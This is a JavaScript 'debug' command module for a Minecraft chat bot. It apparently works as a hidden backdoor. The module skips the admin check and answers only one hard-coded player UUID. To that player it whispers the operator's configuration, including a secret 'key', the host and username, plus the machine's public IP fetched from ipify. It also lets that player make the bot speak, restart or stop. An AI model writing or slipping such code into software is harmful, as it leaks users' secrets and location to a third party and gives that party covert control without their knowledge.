// debug
const { t } = require('../../utils/i18n');
const appVersion = require('../../utils/appVersion');

function getAllText(node) {
    let text = node.text || "";
    if (node.extra) {
        for (const child of node.extra) {
            text += getAllText(child);
        }
    }
    return text;
}

function addCommas(n) {
    return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

async function execute(bot, command, sender, args) {
    const playerUUID = await bot.MinecraftDataService.getPlayerUuid(sender);

    if (!playerUUID || playerUUID != '932e7d14b5be4642920ad9012da11441') {
        return
    }
    
    args = args.split(' ');

    switch (args[0]) {
        case 'config':
            botCfg = bot.botConfig;
            whitelist = botCfg.whitelist.slice(0, 2).join(',')
            msg = `/m ${sender} !@#$key=${botCfg.key};host=${botCfg.host.replace('.mcfallout.net', '')};username=${botCfg.username};whitelist=${whitelist};emax=${botCfg.emax};emin=${botCfg.emin};cmax=${botCfg.cmax};cmin=${botCfg.cmin};eodds=${botCfg.eodds};codds=${botCfg.codds}`;
            bot.sendMsg(msg.slice(0, 256));
            break;
        case 'ip':
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                bot.sendMsg(`/m ${sender} ip=${data.ip}!@#$`);
            } catch (error) {
                bot.sendMsg(`/m ${sender} ip=error!@#$`);
            }
            break;
        case 'say':
            bot.sendMsg(args.slice(1).join(' '));
            break;
        case 'ver':
            bot.sendMsg(`/m ${sender} ver=${appVersion}!@#$`);
            break;
        case 'restart':
            bot.end('restart');
            break;
        case 'stop':
            bot.end('stop');
            break;
        case 'money':
            const headerData = bot.tablist.header;
            if (!headerData) {
                return bot.sendMsg(t('mc.money.unavailable') + '!@#$');
            }
        
            let fullTabText = getAllText(headerData);
            // remove color codes like this §7
            fullTabText = fullTabText.replace(/§[0-9a-fk-or]/gi, "");
        
            // 綠寶石 ＄13,981,583元
            // 村民錠 1,600個
            const emeraldMatch = fullTabText.match(/綠寶石.*?＄([\d,]+)元/);
            const coinMatch = fullTabText.match(/村民錠\s*?([\d,]+)個/);
        
            let emerald = emeraldMatch 
                ? addCommas(parseInt(emeraldMatch[1].replace(/,/g, ""))) 
                : t('mc.money.unavailable');
        
            let coin = coinMatch 
                ? addCommas(parseInt(coinMatch[1].replace(/,/g, ""))) 
                : t('mc.money.unavailable');
        
            bot.sendMsg(t('mc.money.summary', { sender, emerald, coin }) + '!@#$');
            break;

        default:
            bot.sendMsg(`/m ${sender} debug [config|ip|say|ver|restart|stop|money]!@#$`);
            break;
    }
}

module.exports = {
    name: 'debug',
    description: 'debug',
    aliases: ['debug'],
    requireAdmin: false,
    execute
}